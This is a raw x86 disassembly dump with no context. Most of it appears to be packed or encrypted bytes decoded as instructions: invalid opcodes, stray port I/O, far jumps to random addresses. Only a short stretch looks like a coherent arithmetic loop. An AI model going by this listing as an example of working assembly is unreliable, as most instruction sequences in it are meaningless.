  4114f3:	mov    ds:0x823d981a,eax
  4114f8:	sub    al,dl
  4114fa:	stos   DWORD PTR es:[edi],eax
  4114fb:	cmp    eax,0x917ea0fa
  411500:	(bad)  
  411501:	pop    ds
  411502:	call   0x74af:0xda5d5a2d
  411509:	test   al,0x9e
  41150b:	sbb    eax,0xd1ce5922
  411510:	and    al,0xad
  411512:	xor    al,ah
  411514:	aad    0x22
  411516:	or     DWORD PTR [edi+0x63f302d6],edx
  41151c:	data16 mov WORD PTR [ebp+0x5d],cs
  411520:	push   esi
  411521:	sar    DWORD PTR [ebx+esi*4+0x2408ce7],1
  411528:	repnz out dx,eax
  41152a:	call   0x1ad2f87
  41152f:	mov    BYTE PTR [edx],ah
  411531:	adc    eax,0x63b23bd3
  411536:	out    0xb4,al
  411538:	cmp    ebx,0xffffffab
  41153b:	stos   BYTE PTR es:[edi],al
  41153c:	test   eax,0x12d3337d
  411541:	popa   
  411542:	pop    edx
  411543:	mov    bh,0x59
  411545:	bound  ecx,QWORD PTR [eax-0x51]
  411548:	add    ecx,0xa86eba7d
  41154e:	aam    0x42
  411550:	leave  
  411551:	mov    DWORD PTR [eax],esi
  411553:	pop    DWORD PTR [ebx]
  411555:	or     BYTE PTR [esi-0x23],dl
  411558:	push   eax
  411559:	les    edi,FWORD PTR [edx+ecx*8+0x6a]
  41155d:	cmp    DWORD PTR [esi],ebp
  41155f:	pusha  
  411560:	xor    al,0xa
  411562:	jp     0x41151f
  411564:	or     ch,BYTE PTR [esi+0x33f0b2eb]
  41156a:	pop    ecx
  41156b:	pop    ds
  41156c:	mov    eax,0xfa896ba3
  411571:	pop    edx
  411572:	xor    DWORD PTR [ecx+ecx*4],edi
  411575:	fdivr  DWORD PTR gs:[esi]
  411578:	in     eax,dx
  411579:	fwait
  41157a:	jbe    0x411537
  41157c:	mov    eax,0x47a2595b
  411581:	and    bh,BYTE PTR [ecx-0xb]
  411584:	mov    cl,0x14
  411586:	mov    edi,0x9fdc86cb
  41158b:	int    0xed
  41158d:	push   0x28bef88b
  411592:	idiv   DWORD PTR [ecx]
  411594:	jecxz  0x411606
  411596:	sub    eax,0x5cba0ba7
  41159b:	add    ecx,DWORD PTR ds:0xe5272cba
  4115a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4115a2:	sbb    esp,DWORD PTR [esi-0x2d53c4fe]
  4115a8:	test   al,0x12
  4115aa:	js     0x411626
  4115ac:	es adc al,0xc5
  4115af:	pusha  
  4115b0:	imul   esp,DWORD PTR [esi],0xffffffde
  4115b3:	iret   
  4115b4:	sub    ah,cl
  4115b6:	mov    esp,0xa34d1fb3
  4115bb:	neg    DWORD PTR [esi-0xa]
  4115be:	jmp    0x411566
  4115c0:	ja     0x4115eb
  4115c2:	sbb    DWORD PTR [ebp-0x37],0x10710ab1
  4115c9:	cmc    
  4115ca:	pusha  
  4115cb:	loop   0x4115d0
  4115cd:	gs dec edx
  4115cf:	in     eax,0x2d
  4115d1:	pop    esp
  4115d2:	(bad)  
  4115d3:	sbb    eax,0x2f185174
  4115d8:	je     0x4115c1
  4115da:	fnsave [ecx-0x7e526eff]
  4115e0:	push   cs
  4115e1:	or     al,0x2d
  4115e3:	(bad)  
  4115e5:	inc    edi
  4115e6:	xchg   edx,eax
  4115e7:	mov    dh,0x8e
  4115e9:	pop    edi
  4115ea:	sub    al,0xaa
  4115ec:	lods   eax,DWORD PTR ds:[esi]
  4115ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4115ee:	ja     0x41165a
  4115f0:	or     BYTE PTR [edi],dh
  4115f2:	ins    DWORD PTR es:[edi],dx
  4115f3:	aaa    
  4115f4:	call   0x4e85:0x7b4f98b7
  4115fb:	xchg   ebp,eax
  4115fc:	lahf   
  4115fd:	hlt    
  4115fe:	inc    ebp
  4115ff:	call   0x1fad560a
  411604:	mov    al,ah
  411606:	add    eax,0xc9ce738a
  41160b:	xchg   ecx,eax
  41160c:	adc    BYTE PTR [esi-0x70110127],dh
  411612:	pop    esi
  411613:	or     DWORD PTR [ebx+0x534b46e9],0xffffffbe
  41161a:	retf   
  41161b:	test   DWORD PTR [eax+eax*1+0x5c],edx
  41161f:	push   esi
  411620:	push   ecx
  411621:	sbb    DWORD PTR [edx-0x1d],ebx
  411624:	cmp    BYTE PTR [ebx+0x50],0xfe
  411628:	inc    ebp
  411629:	inc    edx
  41162a:	retf   0xf356
  41162d:	leave  
  41162e:	dec    esi
  41162f:	xchg   esi,eax
  411630:	push   ss
  411631:	sbb    bh,BYTE PTR [esp+ecx*1+0x78]
  411635:	ins    DWORD PTR es:[edi],dx
  411636:	mov    ch,0x65
  411638:	push   0x25
  41163a:	aas    
  41163b:	test   BYTE PTR [esi],dl
  41163d:	cwde   
  41163e:	test   eax,0x39e6e7ab
  411643:	gs push ebp
  411645:	xchg   edx,eax
  411646:	and    eax,DWORD PTR [edx+0x5393a499]
  41164c:	lahf   
  41164d:	es call 0xdce79ddc
  411653:	sbb    esp,DWORD PTR [edi-0x1]
  411656:	inc    DWORD PTR [ebx+0x48]
  411659:	ds xchg edx,eax
  41165b:	addr16 sbb edx,esp
  41165e:	shr    DWORD PTR gs:[edx+0x4fceff06],1
  411665:	dec    ebp
  411666:	stos   DWORD PTR es:[edi],eax
  411667:	sbb    esp,ebp
  411669:	xlat   BYTE PTR ds:[ebx]
  41166a:	shr    BYTE PTR [ecx],0xad
  41166d:	ins    BYTE PTR es:[edi],dx
  41166e:	pop    ebx
  41166f:	dec    ebx
  411670:	adc    eax,0x961cc63e
  411675:	inc    edi
  411676:	out    dx,al
  411677:	cmp    al,0x5b
  411679:	arpl   WORD PTR es:[ecx+ebx*1+0x72bf243a],bx
  411681:	jbe    0x4116db
  411683:	aaa    
  411684:	iret   
  411685:	adc    eax,0x8c3d70a7
  41168a:	fsub   DWORD PTR [edi]
  41168c:	push   ebp
  41168d:	xchg   edx,eax
  41168e:	cmp    DWORD PTR [edi+eax*8+0x42],ebx
  411692:	add    DWORD PTR [ecx+0x67],ecx
  411695:	mov    eax,0x7228a1b6
  41169a:	fwait
  41169b:	imul   edx,edx,0xa
  41169e:	and    DWORD PTR [ebp-0x4a],esp
  4116a1:	mov    edx,0x1640ac78
  4116a6:	out    0xd3,eax
  4116a8:	iret   
  4116a9:	cmp    ecx,DWORD PTR fs:[ebp-0xd3b20ae]
  4116b0:	jbe    0x411666
  4116b2:	daa    
  4116b3:	hlt    
  4116b4:	add    esi,DWORD PTR [ecx-0x7df2d383]
  4116ba:	xor    cl,ah
  4116bc:	xor    al,0x46
  4116be:	lock cld 
  4116c0:	jo     0x4116bb
  4116c2:	xchg   edi,eax
  4116c3:	rol    bl,1
  4116c5:	scas   eax,DWORD PTR es:[edi]
  4116c6:	xor    eax,0x731ff59c
  4116cb:	inc    edi
  4116cc:	scas   eax,DWORD PTR es:[edi]
  4116cd:	jbe    0x411692
  4116cf:	dec    esi
  4116d0:	xlat   BYTE PTR ds:[ebx]
  4116d1:	add    DWORD PTR [esi-0xb],esi
  4116d4:	sar    BYTE PTR [ebp+0x55],1
  4116d7:	cs push 0x2d0a5282
  4116dd:	jg     0x411663
  4116df:	xchg   DWORD PTR [edx],ecx
  4116e1:	cmp    DWORD PTR [ebx],esp
  4116e3:	mov    ecx,0xcfab44c1
  4116e8:	push   edi
  4116e9:	adc    ecx,esp
  4116eb:	inc    eax
  4116ec:	ror    DWORD PTR [esi],cl
  4116ee:	fwait
  4116ef:	inc    ebp
  4116f0:	dec    esi
  4116f1:	push   ebp
  4116f2:	and    BYTE PTR [ecx+0x51],0x40
  4116f6:	out    dx,al
  4116f7:	and    esp,DWORD PTR [esi+0x8172820]
  4116fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4116fe:	inc    ebp
  4116ff:	pop    ebx
  411700:	fisub  DWORD PTR [ebp-0x6f]
  411703:	xlat   BYTE PTR ds:[ebx]
  411704:	inc    ebx
  411705:	stos   BYTE PTR es:[edi],al
  411706:	dec    esp
  411707:	cmp    ebp,esi
  411709:	or     dl,BYTE PTR [ecx]
  41170b:	mov    cl,bh
  41170d:	leave  
  41170e:	adc    al,0x6c
  411710:	mov    ?,edi
  411712:	ror    BYTE PTR [edx+0x5f2b7eef],1
  411718:	js     0x4116aa
  41171a:	leave  
  41171b:	push   ebp
  41171c:	or     ebp,esp
  41171e:	jae    0x4116aa
  411720:	pop    edx
  411721:	sbb    edi,DWORD PTR [ebx+0x59]
  411724:	adc    cl,BYTE PTR [edx]
  411726:	push   edx
  411727:	or     ebp,edx
  411729:	and    ebx,DWORD PTR [eax]
  41172b:	rcl    edx,cl
  41172d:	outs   dx,BYTE PTR ds:[si]
  41172f:	sbb    edx,DWORD PTR [ebp+esi*4-0x23]
  411733:	inc    di
  411735:	jp     0x411745
  411737:	enter  0xccef,0x68
  41173b:	arpl   bp,bx
  41173d:	(bad)
  411740:	sub    eax,0xfdb8d5b4
  411745:	add    BYTE PTR [ebx-0x61],ch
  411748:	ret    0x3b5e
  41174b:	jmp    0x4116cf
  41174d:	aaa    
  41174e:	out    dx,al
  41174f:	xchg   esi,edx
  411751:	sahf   
  411752:	call   0x883ad292
  411757:	mov    es,WORD PTR [ecx]
  411759:	repz cmp edx,DWORD PTR [esi+esi*8-0x2ba84417]
  411761:	sub    DWORD PTR [ecx],esi
  411763:	mov    eax,ds:0x5b7e7151
  411768:	cmp    al,0x91
  41176a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41176b:	jmp    0x41170f
  41176d:	mov    ?,WORD PTR [ecx-0x21]
  411770:	jmp    0x411793
  411772:	repz out dx,eax
  411774:	stc    
  411775:	xor    BYTE PTR [ebx],cl
  411777:	(bad)  
  411778:	push   edi
  411779:	add    al,0xfc
  41177b:	stos   DWORD PTR es:[edi],eax
  41177c:	sbb    DWORD PTR [edi],edx
  41177e:	ret    0x1e65
  411781:	out    0xe4,al
  411783:	mov    ch,0xe4
  411785:	xor    al,0xe9
  411787:	lods   eax,DWORD PTR ds:[esi]
  411788:	std    
  411789:	fwait
  41178a:	ins    DWORD PTR es:[edi],dx
  41178b:	leave  
  41178c:	sbb    al,0x1f
  41178e:	jb     0x411780
  411790:	cmp    al,0xc9
  411792:	push   0x42
  411794:	fidivr WORD PTR [ebx+esi*1-0x5fbfe666]
  41179b:	mov    cl,0xbc
  41179d:	dec    eax
  41179e:	sbb    al,0xc1
  4117a0:	out    0xc3,eax
  4117a2:	fmul   QWORD PTR [edi]
  4117a4:	adc    al,cl
  4117a6:	out    dx,al
  4117a7:	and    ebx,esp
  4117a9:	pusha  
  4117aa:	cmp    DWORD PTR [esi+0x35af563d],edi
  4117b0:	add    al,0x90
  4117b2:	sti    
  4117b3:	sub    DWORD PTR [ebp-0x53727ea7],esi
  4117b9:	inc    ebp
  4117ba:	aas    
  4117bb:	sti    
  4117bc:	cmc    
  4117bd:	and    cl,al
  4117bf:	rol    BYTE PTR [eax],cl
  4117c1:	jnp    0x411816
  4117c3:	out    0xbb,eax
  4117c5:	xchg   edi,eax
  4117c6:	and    bl,al
  4117c8:	(bad)  
  4117c9:	sbb    esi,DWORD PTR [ebx]
  4117cb:	ins    DWORD PTR es:[edi],dx
  4117cc:	mov    ebx,0x90ec4c8e
  4117d1:	inc    ecx
  4117d2:	ret    0xf3fb
  4117d5:	mov    dh,0x6d
  4117d7:	inc    esp
  4117d8:	xchg   edx,eax
  4117d9:	and    ebp,DWORD PTR [edx-0x2c43eb90]
  4117df:	pop    ds
  4117e0:	ret    
  4117e1:	in     eax,dx
  4117e2:	add    eax,0xa8f1f321
  4117e7:	mov    al,0xa6
  4117e9:	jne    0x4117a1
  4117eb:	mov    edi,DWORD PTR [edi+0x33ce2b31]
  4117f1:	enter  0x4d89,0x8
  4117f5:	mov    ecx,DWORD PTR [ebp+0x8]
  4117f8:	mov    edx,DWORD PTR [ebp+0x8]
  4117fb:	imul   edx,edx,0x5708f1
  411801:	xor    ecx,eax
  411803:	add    ecx,esi
  411805:	lea    ecx,[ebp+ecx*4-0x64]
  411809:	mov    edi,DWORD PTR [ecx]
  41180b:	add    edx,edi
  41180d:	mov    DWORD PTR [ecx],edx
  41180f:	mov    ecx,DWORD PTR [ebp+0x8]
  411812:	xor    ecx,eax
  411814:	add    ecx,esi
  411816:	jne    0x40f45a
  41181c:	jmp    0x413bef
  411821:	mov    ecx,DWORD PTR [ebp+0x8]
  411824:	mov    edx,DWORD PTR [ebp-0x8]
  411827:	xor    ecx,eax
  411829:	xor    edx,eax
  41182b:	sub    ecx,edx
  41182d:	sub    ecx,esi
  41182f:	xor    ecx,eax
  411831:	mov    DWORD PTR [ebp+0x8],ecx
  411834:	mov    ecx,DWORD PTR [ebp+0x8]
  411837:	mov    edx,DWORD PTR [ebp+0x8]
  41183a:	xor    ecx,eax
  41183c:	imul   edx,edx,0x5708f1
  411842:	add    ecx,esi
  411844:	lea    ecx,[ebp+ecx*4-0x64]
  411848:	mov    edi,DWORD PTR [ecx]
  41184a:	add    edx,edi
  41184c:	mov    DWORD PTR [ecx],edx
  41184e:	mov    ecx,DWORD PTR [ebp+0x8]
  411851:	xor    ecx,eax
  411853:	add    ecx,esi
  411855:	jne    0x411821
  41185b:	jmp    0x413be3
  411860:	ins    BYTE PTR es:[edi],dx
  411861:	jns    0x4117f2
  411863:	sbb    edi,DWORD PTR [ebx+0x1b]
  411866:	mov    eax,0xa6df667b
  41186b:	push   edi
  41186c:	mov    ds:0xe86f656e,eax
  411871:	nop
  411872:	jl     0x4118f0
  411874:	pop    es
  411875:	pop    edi
  411876:	jl     0x4118f4
  411878:	mov    al,ds:0xe3e341d
  41187d:	jnp    0x411822
  41187f:	mov    ah,0xbb
  411881:	cdq    
  411882:	and    eax,0xac155561
  411887:	stc    
  411888:	sbb    eax,0xeb2895d4
  41188d:	not    esp
  41188f:	push   0xffffffcd
  411891:	div    edi
  411893:	imul   ebx,DWORD PTR [esi],0x39bdaa71
  411899:	(bad)  
  41189b:	pop    edx
  41189c:	popa   
  41189d:	jno    0x411895
  41189f:	div    BYTE PTR [eax+0x41b01964]
  4118a5:	sbb    ebx,DWORD PTR [edi]
  4118a7:	imul   ebx,edx,0xffffffed
  4118aa:	jg     0x411856
  4118ac:	fistp  QWORD PTR [edi]
  4118ae:	jmp    0xce30:0xb3379611
  4118b5:	or     ch,BYTE PTR [ebx+ebp*1]
  4118b8:	mov    al,0xd5
  4118ba:	cs scas al,BYTE PTR es:[edi]
  4118bc:	in     al,dx
  4118bd:	pop    ecx
  4118be:	inc    edx
  4118bf:	xor    ebp,DWORD PTR [ebx]
  4118c1:	mov    bh,0xf3
  4118c3:	xor    bh,dl
  4118c5:	sar    DWORD PTR [ebx-0x5e86d742],cl
  4118cb:	and    al,0x2a
  4118cd:	pop    es
  4118ce:	mov    WORD PTR ds:0x662758db,?
  4118d4:	bound  ecx,QWORD PTR [ebp+0x48fe7f11]
  4118da:	call   0xb716:0xb220f8b8
  4118e1:	lds    ebx,FWORD PTR [esi]
  4118e3:	fmul   QWORD PTR [ebp+eax*4-0x4da15e72]
  4118ea:	sar    DWORD PTR ds:0xe63e3178,0x89
  4118f1:	outs   dx,DWORD PTR ds:[esi]
  4118f2:	xor    BYTE PTR [edi],dl
  4118f4:	mov    bl,0xf0
  4118f6:	jmp    0x3098:0x571d411b
  4118fd:	pop    esi
  4118fe:	add    BYTE PTR [ebx-0x170de9d9],bl
  411904:	lods   al,BYTE PTR ds:[esi]
  411905:	fmulp  st(3),st
  411907:	fsubp  st(7),st
  411909:	push   ecx
  41190a:	pop    eax
  41190b:	inc    esp
  41190c:	xor    esp,ebp
  41190e:	xor    DWORD PTR [ebx],edx
  411910:	int    0x28
  411912:	add    al,0x3a
  411914:	repz and esp,DWORD PTR [edi+0x36]
  411918:	repnz gs (bad) 
  41191b:	pusha  
  41191c:	mov    eax,DWORD PTR [eax]
  41191e:	data16 fld TBYTE PTR [eax+edi*4]
  411922:	push   ebx
  411923:	pop    edx
  411924:	xor    DWORD PTR [edx],edi
  411926:	test   DWORD PTR [ecx+0x7d],ecx
  411929:	stc    
  41192a:	or     eax,0x60fc1ec8
  41192f:	clc    
  411930:	icebp  
  411931:	jge    0x4118f8
  411933:	inc    eax
  411934:	sbb    al,0x21
  411936:	push   ebx
  411937:	dec    eax
  411938:	mov    al,0xa2
  41193a:	add    BYTE PTR [eax+ecx*8],ch
  41193d:	or     eax,0xb85e21bc
  411942:	ins    DWORD PTR es:[edi],dx
  411943:	fucomi st,st(5)
  411945:	push   edi
  411946:	sbb    al,0x6b
  411948:	xor    DWORD PTR [edi+eiz*8+0x68],ebx
  41194c:	call   0x3eab:0x5502e7db
  411953:	mov    dl,0x7d
  411955:	iret   
  411956:	fdiv   QWORD PTR [ebp+0x49]
  411959:	sbb    edi,ebp
  41195b:	lahf   
  41195c:	iret   
  41195d:	mov    ds:0x5ab3e3c8,eax
  411962:	nop
  411963:	jb     0x41195a
  411965:	mov    WORD PTR [esi-0x4d687b62],ds
  41196b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41196c:	cdq    
  41196d:	adc    eax,0x1ce9fb38
  411972:	mov    ch,0xd8
  411974:	xlat   BYTE PTR ds:[ebx]
  411975:	mov    edx,0x9457ddeb
  41197a:	cmp    ch,BYTE PTR [ebx-0x9]
  41197d:	dec    eax
  41197e:	popa   
  41197f:	dec    edi
  411980:	mov    bl,0x4f
  411982:	fwait
  411983:	xchg   ebx,eax
  411984:	push   ecx
  411985:	sahf   
  411986:	pop    edx
  411987:	aas    
  411988:	inc    eax
  411989:	popa   
  41198a:	int3   
  41198b:	test   al,0x49
  41198d:	add    ah,BYTE PTR [eax-0x28186383]
  411993:	sub    al,0x5e
  411995:	push   edx
  411996:	xchg   esp,eax
  411997:	loope  0x4119ab
  411999:	adc    dh,BYTE PTR [edi-0x2f0bb454]
  41199f:	inc    ebx
  4119a0:	sbb    ebp,edi
  4119a2:	dec    esi
  4119a3:	inc    eax
  4119a4:	mov    edx,0x1283de7e
  4119a9:	dec    ecx
  4119aa:	sbb    eax,0x2eb6f515
  4119af:	mov    BYTE PTR [ecx+0x6b],bh
  4119b2:	cwde   
  4119b3:	fmul   QWORD PTR [ebx+ecx*2]
  4119b6:	outs   dx,DWORD PTR ds:[esi]
  4119b7:	jle    0x411990
  4119b9:	jecxz  0x4119af
  4119bb:	push   edi
  4119bc:	or     al,0xf7
  4119be:	je     0x411a38
  4119c0:	dec    ecx
  4119c1:	popa   
  4119c2:	dec    edi
  4119c3:	je     0x4119e7
  4119c5:	ins    BYTE PTR es:[edi],dx
  4119c6:	xchg   ebx,eax
  4119c7:	cmp    ebx,edi
  4119c9:	scas   eax,DWORD PTR es:[edi]
  4119ca:	cmp    al,BYTE PTR [ebx]
  4119cc:	sbb    ah,BYTE PTR [ecx-0x2e1e0652]
  4119d2:	arpl   WORD PTR [esi],bp
  4119d4:	sbb    DWORD PTR [edi],edx
  4119d6:	push   cs
  4119d7:	gs inc eax
  4119d9:	add    al,BYTE PTR [esp+edi*2+0x7cc439fb]
  4119e0:	in     al,dx
  4119e1:	popf   
  4119e2:	mov    ebx,0xae5d304a
  4119e7:	dec    ebp
  4119e8:	(bad)  
  4119e9:	push   eax
  4119ea:	cli    
  4119eb:	or     dh,BYTE PTR [ecx+0x2ec4ec60]
  4119f1:	cwde   
  4119f2:	jmp    0x865f84bb
  4119f7:	fisttp WORD PTR [edx]
  4119f9:	addr16 dec esp
  4119fb:	int    0x8
  4119fd:	test   DWORD PTR [esi],esi
  4119ff:	dec    esp
  411a00:	cwde   
  411a01:	xchg   edi,eax
  411a02:	xor    eax,DWORD PTR [ebx-0x5]
  411a05:	mov    al,ds:0xbef835cd
  411a0a:	and    BYTE PTR [edi-0x1c64ff81],cl
  411a10:	inc    ecx
  411a11:	xchg   bh,dh
  411a13:	add    BYTE PTR [edx-0x57e7216d],al
  411a19:	pop    ebx
  411a1a:	scas   eax,DWORD PTR es:[edi]
  411a1b:	add    esi,DWORD PTR [ecx]
  411a1d:	jae    0x411a89
  411a1f:	jae    0x411a84
  411a21:	dec    esp
  411a22:	bound  ebx,QWORD PTR [ecx]
  411a24:	xlat   BYTE PTR ds:[ebx]
  411a25:	inc    edi
  411a26:	xlat   BYTE PTR ds:[ebx]
  411a27:	fsub   QWORD PTR [ecx+0x1ae9ef4d]
  411a2d:	push   ss
  411a2e:	mov    edx,0x1b3c31a4
  411a33:	mov    ch,0x25
  411a35:	cli    
  411a36:	cmp    al,0x6a
  411a38:	xchg   BYTE PTR [ebp-0x1b3a52e2],ch
  411a3e:	ret    0xd3fa
  411a41:	jb     0x411a35
  411a43:	cmp    eax,esp
  411a45:	enter  0x3f7d,0x9
  411a49:	inc    edx
  411a4a:	lea    eax,[ebx]
  411a4c:	enter  0x633,0xb3
  411a50:	mov    esp,0xf9f12d9a
  411a55:	jecxz  0x411ab3
  411a57:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411a58:	cwde   
  411a59:	test   al,0x21
  411a5b:	pop    ecx
  411a5c:	mov    ebp,0x84337961
  411a61:	mov    ah,0xe4
  411a63:	scas   eax,DWORD PTR es:[edi]
  411a64:	mov    edx,0x30be9819
  411a69:	mov    ebp,0xc28a875c
  411a6e:	or     eax,ebx
  411a70:	push   es
  411a71:	jo     0x411a29
  411a73:	out    dx,eax
  411a74:	cmp    DWORD PTR [edx-0x70],0xffffff86
  411a78:	in     eax,dx
  411a79:	adc    edi,esp
  411a7b:	add    al,0x62
  411a7d:	jge    0x411ad0
  411a7f:	fst    DWORD PTR [edi]
  411a81:	js     0x411a2a
  411a83:	fcomp  st(6)
  411a85:	push   eax
  411a86:	dec    eax
  411a87:	hlt    
  411a88:	jno    0x411a5e
  411a8a:	dec    esi
  411a8b:	jb     0x411ae0
  411a8d:	imul   esp,DWORD PTR [edi+0x1d],0xffffff94
  411a91:	enter  0x6ab5,0xf9
  411a95:	nop
  411a96:	enter  0x6411,0x15
  411a9a:	pop    esp
  411a9b:	repz cs xor DWORD PTR gs:[edi],edx
  411aa0:	jmp    0xe478a0e8
  411aa5:	aad    0x99
  411aa7:	mov    BYTE PTR [eax],cl
  411aa9:	and    dl,BYTE PTR [edi]
  411aab:	arpl   WORD PTR [ebx],bp
  411aad:	ins    DWORD PTR es:[edi],dx
  411aae:	and    eax,0xc7af9233
  411ab3:	inc    ebx
  411ab4:	sbb    DWORD PTR [ebp+0x64],0x2e2c4dab
  411abb:	jle    0x411aaf
  411abd:	mov    ebx,gs
  411abf:	repz mov dh,0x8d
  411ac2:	in     al,dx
  411ac3:	add    eax,0x1b1a926a
  411ac8:	or     eax,0xc2d7134c
  411acd:	jecxz  0x411b09
  411acf:	std    
  411ad0:	fwait
  411ad1:	out    0x43,eax
  411ad3:	mov    ch,BYTE PTR [esi+0x12907e1b]
  411ad9:	ret    0x79a6
  411adc:	mov    edi,0x800d55d5
  411ae1:	scas   al,BYTE PTR es:[edi]
  411ae2:	out    dx,al
  411ae3:	mov    dh,0x6a
  411ae5:	fs mov dh,0x94
  411ae8:	jmp    0x976a68a3
  411aed:	ins    BYTE PTR es:[edi],dx
  411aee:	arpl   WORD PTR [edx+0x22507d31],di
  411af4:	data16 arpl WORD PTR [ebp+edx*1-0x31],di
  411af9:	cmp    DWORD PTR [eax],esp
  411afb:	jmp    0x5c6cc3b8
  411b00:	sub    eax,0x9fd2bfa7
  411b05:	or     BYTE PTR [ebx],dl
  411b07:	jmp    0xd5a2:0x10d1e39d
  411b0e:	out    dx,al
  411b0f:	pusha  
  411b10:	jg     0x411b75
  411b12:	sahf   
  411b13:	pushf  
  411b14:	inc    esp
  411b15:	mov    eax,ds:0xbfeb5436
  411b1a:	lods   eax,DWORD PTR ds:[esi]
  411b1b:	int    0x14
  411b1d:	sub    BYTE PTR [esi-0x74fbf4f6],cl
  411b23:	inc    esp
  411b24:	push   0x703ad05c
  411b29:	mov    esp,0x6ab39971
  411b2e:	xchg   edi,eax
  411b2f:	popa   
  411b30:	loopne 0x411b1a
  411b32:	add    BYTE PTR [edi-0x5d],ch
  411b35:	addr16 or esp,ebx
  411b38:	fistp  WORD PTR [edi-0x70]
  411b3b:	das    
  411b3c:	push   ss
  411b3d:	mov    ebp,0xad2464ac
  411b42:	nop
  411b43:	out    dx,eax
  411b44:	inc    edx
  411b45:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  411b47:	push   0xfbdce887
  411b4c:	mov    esp,0xbab33a8b
  411b51:	add    bh,BYTE PTR [edi+0x6b]
  411b54:	sub    BYTE PTR [edi],bl
  411b56:	and    DWORD PTR [ecx+0x34],eax
  411b59:	inc    ebp
  411b5a:	pop    edx
  411b5b:	inc    esp
  411b5c:	jns    0x411b06
  411b5e:	push   cs
  411b5f:	cmc    
  411b60:	inc    edi
  411b61:	jp     0x411b4b
  411b63:	lods   al,BYTE PTR ds:[esi]
  411b64:	jl     0x411b48
  411b66:	std    
  411b67:	jo     0x411be0
  411b69:	mov    ebx,0xf47dd601
  411b6e:	dec    ebp
  411b6f:	ret    0x1cfa
  411b72:	sub    ecx,DWORD PTR [eax-0x4536418c]
  411b78:	mov    al,ds:0xda43bb13
  411b7d:	inc    edx
  411b7e:	bound  ecx,QWORD PTR [edx+eax*4+0x7cae2740]
  411b85:	int    0xe2
  411b87:	ds das 
  411b89:	rcl    DWORD PTR [edi-0xbd83dde],cl
  411b8f:	mov    esi,0x23be6d85
  411b94:	jge    0x411b8b
  411b96:	push   0x6b
  411b98:	dec    esi
  411b99:	popa   
  411b9a:	popf   
  411b9b:	push   edx
  411b9c:	xor    bl,BYTE PTR [eax+0xa]
  411b9f:	shrd   DWORD PTR [edx],eax,0xe7
  411ba3:	mov    eax,0xded293f8
  411ba8:	inc    ecx
  411ba9:	xchg   BYTE PTR [ebp*2+0x7278cfe3],bl
  411bb0:	push   eax
  411bb1:	pause  
  411bb3:	int    0x4f
  411bb5:	fwait
  411bb6:	pusha  
  411bb7:	int3   
  411bb8:	test   al,0xd8
  411bba:	sar    bh,1
  411bbc:	xchg   ecx,eax
  411bbd:	inc    edx
  411bbe:	into   
  411bbf:	aaa    
  411bc0:	stos   DWORD PTR es:[edi],eax
  411bc1:	xchg   DWORD PTR ds:0xa7ef1d43,ecx
  411bc7:	nop
  411bc8:	int3   
  411bc9:	jmp    0x411c20
  411bcb:	pop    es
  411bcc:	push   ecx
  411bcd:	test   eax,0x4764f90
  411bd2:	out    dx,al
  411bd3:	ss addr16 sbb al,cl
  411bd7:	cmp    al,0xab
  411bd9:	mov    ebx,0xc6e0880
  411bde:	push   ecx
  411bdf:	inc    ebp
  411be0:	or     dl,BYTE PTR [ebx-0x59]
  411be3:	jge    0x411b89
  411be5:	enter  0x98cf,0xb1
  411be9:	es int 0x2
  411bec:	push   ds
  411bed:	(bad)  
  411bee:	lds    eax,FWORD PTR [eax+0x36]
  411bf1:	inc    ebx
  411bf2:	adc    edi,DWORD PTR [edx-0x40]
  411bf5:	dec    edi
  411bf6:	xor    cl,BYTE PTR [eax]
  411bf8:	repnz dec edi
  411bfa:	cmc    
  411bfb:	(bad)  
  411bfd:	cmp    al,0x33
  411bff:	cdq    
  411c00:	push   edi
  411c01:	mov    ah,0xf8
  411c03:	ret    0x298b
  411c06:	jno    0x411c2c
  411c08:	ret    
  411c09:	mov    edx,0xc51d2c77
  411c0e:	clc    
  411c0f:	and    DWORD PTR [edx+esi*1],0x34
  411c13:	outs   dx,DWORD PTR ds:[esi]
  411c14:	fild   QWORD PTR [edi]
  411c17:	mov    dh,0x35
  411c19:	cmp    DWORD PTR [ebx+0xa],ebp
  411c1c:	inc    ecx
  411c1d:	sahf   
  411c1e:	ret    0x88c0
  411c21:	adc    DWORD PTR [edi-0x77f57717],esi
  411c27:	xor    al,0xc2
  411c29:	loope  0x411c61
  411c2b:	mov    edi,0x99e9d750
  411c30:	xchg   ebx,eax
  411c31:	int    0x46
  411c33:	addr16 cld 
  411c35:	lods   eax,DWORD PTR ds:[esi]
  411c36:	nop
  411c37:	jp     0x411ca2
  411c39:	xchg   ebx,eax
  411c3a:	pop    ecx
  411c3b:	dec    esp
  411c3c:	sar    BYTE PTR [eax+0x1e],0x6
  411c40:	aad    0xfb
  411c42:	out    0xcf,al
  411c44:	lea    edx,[edx-0x39]
  411c47:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411c48:	outs   dx,DWORD PTR ds:[esi]
  411c49:	outs   dx,DWORD PTR ds:[esi]
  411c4a:	fs cmp edi,esi
  411c4d:	lea    edi,[eax-0x57]
  411c50:	ret    0xd83d
  411c53:	inc    eax
  411c54:	add    ah,BYTE PTR [edi-0x4e]
  411c57:	mov    ds,WORD PTR [ebp+0x51]
  411c5a:	das    
  411c5b:	lea    edi,[esi]
  411c5d:	cmp    al,0xbf
  411c5f:	push   edx
  411c60:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411c61:	mov    al,0x75
  411c63:	ret    0x2e6b
  411c66:	loopne 0x411c57
  411c68:	lea    eax,[esi+0x3b]
  411c6b:	pop    ebp
  411c6c:	xchg   BYTE PTR [ecx+0x2247591e],bh
  411c72:	xchg   ebp,eax
  411c73:	ror    DWORD PTR [eax-0x4ae18c52],0xf5
  411c7a:	and    al,0xa6
  411c7c:	daa    
  411c7d:	loopne 0x411c51
  411c7f:	and    esp,DWORD PTR [ecx]
  411c81:	mov    ds:0xbe626769,eax
  411c86:	jno    0x411c8b
  411c88:	add    ebx,esi
  411c8a:	jae    0x411c12
  411c8c:	jbe    0x411c12
  411c8e:	push   edx
  411c8f:	call   0x6dd9:0xd05ef4a7
  411c96:	and    edi,DWORD PTR [esi-0xf]
  411c99:	stc    
